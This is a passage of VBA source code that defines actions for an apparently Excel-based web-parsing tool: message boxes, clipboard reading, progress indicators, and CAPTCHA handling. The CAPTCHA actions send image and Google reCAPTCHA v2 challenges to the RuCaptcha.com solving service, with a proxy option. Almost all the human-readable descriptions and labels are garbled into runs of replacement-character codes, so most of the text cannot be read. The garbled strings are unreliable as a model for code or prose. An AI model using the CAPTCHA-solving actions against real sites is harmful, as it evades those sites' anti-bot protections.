                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| OK |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| = |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "vbOKOnly = 0,  vbOKCancel = 1,  vbAbortRetryIgnore = 2,  vbYesNoCancel = 3,  vbYesNo = 4,  vbRetryCancel = 5" & vbNewLine & _
                       "vbCritical = 16,  vbQuestion = 32,  vbExclamation = 48,  vbInformation = 64" & vbNewLine & _
                       "vbDefaultButton1 = 0,  vbDefaultButton2 = 256,  vbDefaultButton3 = 512" & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| %msgbox% |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: OK = 1, Cancel = 2, Abort = 3, Retry = 4, Ignore = 5, Yes = 6, No = 7" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."

        .AddParameter "Message", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Title", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Buttons", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd||fffd||fffd||fffd|", MSGBOX_OPTIONS, MSGBOX_OPTIONS(0)
        .AddParameter "ReturnValue", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd|", "|fffd||fffd||fffd|"), "|fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Another, "Balloon", "INFO: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| HTML |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, - |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

        .AddParameter "Message", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Type", aps_List, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("Text", "Warning", "Attention", "Information", "Redirect"), "Information"
    End With


    With AAs.AddAction(fc_Another, "GetFromClipboard", "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Windows")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                       "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| CF_TEXT, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|)." & vbNewLine & "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| HTML-|fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd|-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)," & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd|HTML Format|fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|) URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd| |fffd|HTML SourceURL|fffd|)"
        .AddParameter "Format", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "CF_TEXT", "HTML Format", "HTML SourceURL", "CF_OEMTEXT"), ""
    End With

    With AAs.AddAction(fc_Another, "GetCaptcha", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Captcha")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|."
        .AddParameter "ImageURL", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Size", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|", Array("default", "auto", "216:72", "300:200"), "default"
        .AddParameter "Text", aps_Text, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "DefaultValue", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End With

    With AAs.AddAction(fc_Another, "SolveCaptcha", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Captcha")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| RuCaptcha.com." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| API-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                       "(|fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| RuCaptcha.com, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|. |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| API |fffd||fffd||fffd||fffd||fffd||fffd||fffd| rucaptcha.com" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| language=2 |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
        .AddParameter "ImageURL", aps_Text, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "ShowMessage", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("yes", "no"), "no"
        .AddParameter "ExtraOptions", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("", "language=2", "regsense=1", "min_len=4&numeric=1&phrase=1", ""), ""
        .AddParameter "Timeout", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|.", Array("20", "30", "60"), "30"
    End With

    With AAs.AddAction(fc_Another, "SolveGoogleCaptcha", "|fffd||fffd||fffd||fffd||fffd||fffd| Google Captcha v.2")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| RuCaptcha.com." & vbNewLine & _
                       "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| API-|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & _
                       "(|fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| RuCaptcha.com, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| POST |fffd||fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| g-recaptcha-response)" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd|) |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| g-recaptcha-response" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|:" & vbNewLine & _
                       "1) URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| URL, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|);" & vbNewLine & _
                       "2) |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| data-sitekey |fffd||fffd| div class=g-recaptcha (|fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - HTML |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|);" & vbNewLine & vbNewLine & _
                       "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| API |fffd||fffd||fffd||fffd||fffd||fffd||fffd| rucaptcha.com" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| proxy=|fffd||fffd||fffd||fffd||fffd|:|fffd||fffd||fffd||fffd||fffd||fffd|@1.2.3.4:3128 |fffd||fffd||fffd| proxytype=HTTPS"
        .AddParameter "PageURL", aps_Text, "URL |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "SiteKey", aps_Text, "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (data-sitekey)"
        .AddParameter "ShowMessage", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("yes", "no"), "no"
        .AddParameter "ExtraOptions", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", Array("", "proxy=|fffd||fffd||fffd||fffd||fffd|:|fffd||fffd||fffd||fffd||fffd||fffd|@1.2.3.4:3128", "proxytype=HTTPS", ""), ""
        .AddParameter "Timeout", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd|.", Array("30", "60", "100", "120"), "100"
    End With

    With AAs.AddAction(fc_ParserOptions, "ProgressIndicatorNew", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|")
        .Description = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd|, - |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (1, 2 |fffd| |fffd|.|fffd|.), |fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|." & vbNewLine & _
                       "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|$value|fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd|:" & vbNewLine & _
                       "|fffd||fffd||fffd||fffd||fffd||fffd| 2 |fffd||fffd| 15: |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"

        .AddParameter "Line", aps_List, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "2", "3", "4", "5", "6"), "1"
        .AddParameter "ValueType", aps_Combo, "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "|fffd||fffd||fffd||fffd||fffd|"), "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .AddParameter "Value", aps_Combo, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("", "$value"), ""
        .AddParameter "Step", aps_Combo, "|fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", Array("1", "10", "100"), "1"
    End With


    With AAs.AddAction(fc_ParserOptions, "ProgressIndicator", "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd|: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|")
